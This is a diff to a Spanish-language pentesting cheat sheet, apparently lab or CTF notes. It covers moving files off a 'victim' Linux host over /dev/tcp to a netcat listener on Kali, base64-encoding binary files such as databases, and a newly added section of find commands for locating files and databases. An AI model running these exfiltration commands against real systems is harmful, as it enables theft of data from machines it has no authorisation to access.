@@ -41,7 +41,7 @@ cat file.txt > /dev/tcp/192.168.1.23/4444 # on victim linux
 nc -lvp 4444 > file.txt # on Kali
 ```
 * `BASE64` 
-Cuando el archivo no es texto plano, ej: una BD, un id_rsa entonces
+Cuando el archivo no es texto plano, ej: una BD entonces
 Tenemos (2) formas
 1.
 ```bash
@@ -55,4 +55,14 @@ Luego en mi maquina
 ```bash
 base64 -d encodedfile.db.b64 > outputfile.db
 ```
+## Busqueda de archivos
+
+* `find / -name 'sbd*'`
+* `find / -name 'foldername' -type d`
+* `find / -name 'filename' -type f`
+* `find / -name 'sbd*' -exec file {} \;`
+</br> Buscar por extension </br>
+* `find / -type f -iname "*.db" 2>/dev/null`
+</br> Buscar varios archivos
+* `find / -type f \( -iname "*.db" -o -iname "*.sqlite" -o -iname "*.sqlite3" \) 2>/dev/null`
 
